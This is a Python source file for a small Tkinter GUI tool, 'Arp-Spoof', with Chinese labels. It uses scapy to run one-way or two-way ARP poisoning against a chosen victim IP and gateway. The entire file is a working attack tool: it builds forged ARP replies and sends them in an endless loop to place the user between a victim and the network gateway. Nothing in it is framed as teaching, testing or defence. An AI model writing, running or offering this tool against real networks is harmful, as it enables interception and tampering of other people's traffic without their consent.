import threading
from tkinter import *
from tkinter import messagebox
from scapy.all import *
from scapy.layers.l2 import ARP, Ether, getmacbyip

thread = threading.Thread(target=None)
def gui():
    global gateway_ip, target_ip, oneself_ip
    global code_run, code_run_two, root
    root = Tk()
    root.config(bg='#CCCCCC')
    root.title("Arp-Spoof")
    root.geometry('350x220')
    code_run = StringVar(value=1)
    code_run_two = StringVar(value=1)
    target_ip = StringVar()
    gateway_ip = StringVar()
    oneself_ip = StringVar()
    root.protocol("WM_DELETE_WINDOW", no_closing)
    Label(root, text="受害者ip：", bg='#CCCCCC', font=('Courier', 10)).place(x=5, y=20, width=75, height=35)
    Label(root, text="网关：", bg='#CCCCCC', font=('Courier', 10)).place(x=5, y=65, width=75, height=35)
    Label(root, text="本机ip：", bg='#CCCCCC', font=('Courier', 10)).place(x=5, y=110, width=75, height=35)
    Entry(root, textvariable=target_ip, font=('Courier', 12)).place(x=100, y=20, width=160, height=35)
    Entry(root, textvariable=gateway_ip, font=('Courier', 12)).place(x=100, y=65, width=160, height=35)
    Entry(root, textvariable=oneself_ip, font=('Courier', 12)).place(x=100, y=110, width=160, height=35)
    Button(root, text="单向欺骗", font=("Times", 15), bg='#DDDDDD', command=run).place(x=70, y=155, width=90, height=35)
    Button(root, text="双向欺骗", font=("Times", 15), bg='#DDDDDD', command=run_tow).place(x=200, y=155, width=90, height=35)
    root.mainloop()


def run():
    # 单向欺骗点击事件
    global code_run, code_run_two, thread
    if inspect_ip():
        if code_run:
            target_mac = getmacbyip(target_ip.get())
            gateway_mac = getmacbyip(gateway_ip.get())
            if target_ip.get() == '0.0.0.0':
                target_mac = 'ff:ff:ff:ff:ff:ff'
            thread = threading.Thread(target=poison_target,
                                      args=(gateway_ip.get(), gateway_mac, target_ip.get(), target_mac,))
            thread.start()
            code_run = 0
        else:
            stop_thread(thread)
            code_run = 1


def inspect_ip():
    if target_ip.get() == '':
        messagebox.showinfo('提示！', '受害者IP为空！')
        return False
    elif gateway_ip.get() == '':
        messagebox.showinfo('提示！', '网关为空！')
        return False
    else:
        return True


def run_tow():
    # 双向欺骗点击事件
    global code_run, code_run_two, thread
    if inspect_ip():
        if code_run:
            target_mac = getmacbyip(target_ip.get())
            gateway_mac = getmacbyip(gateway_ip.get())
            thread = threading.Thread(target=poison_target_two,
                                      args=(gateway_ip.get(), gateway_mac, target_ip.get(), target_mac,))
            thread.start()
            code_run = 0
        else:
            stop_thread(thread)
            code_run = 1


def _async_raise(tid, exctype):
    tid = ctypes.c_long(tid)
    if not inspect.isclass(exctype):
        exctype = type(exctype)
    res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
    if res == 0:
        raise ValueError("invalid thread id")
    elif res != 1:
        ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
        raise SystemError("PyThreadState_SetAsyncExc failed")


def stop_thread(thread):
    _async_raise(thread.ident, SystemExit)


def poison_target_two(gateway_ip, gateway_mac, target_ip, target_mac):
    # 双向欺骗
    target = ARP()
    target.op = 2
    target.psrc = gateway_ip
    target.pdst = target_ip
    target.hwdst = target_mac
    packet_target = Ether(dst=target_mac) / target
    gateway = ARP()
    gateway.op = 2
    gateway.psrc = target_ip
    gateway.pdst = gateway_ip
    gateway.hwdst = gateway_mac
    packet_gateway = Ether(dst=gateway_mac) / gateway
    while True:
        try:
            sendp(packet_target)
            sendp(packet_gateway)
            time.sleep(0.3)
        except:
            print("[*] ARP poison attack finished.")
            break


def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    # 单向欺骗
    target = ARP()
    target.op = 2
    target.psrc = gateway_ip
    target.pdst = target_ip
    target.hwdst = target_mac
    packet_target = Ether(dst=target_mac) / target
    while True:
        try:
            sendp(packet_target)
            time.sleep(0.3)
        except:
            print("[*] ARP poison attack finished.")
            break


def no_closing():
    # 设置关闭方式的函数
    if thread.is_alive():
        stop_thread(thread)
        root.destroy()
    else:
        root.destroy()


if __name__ == '__main__':
    gui()
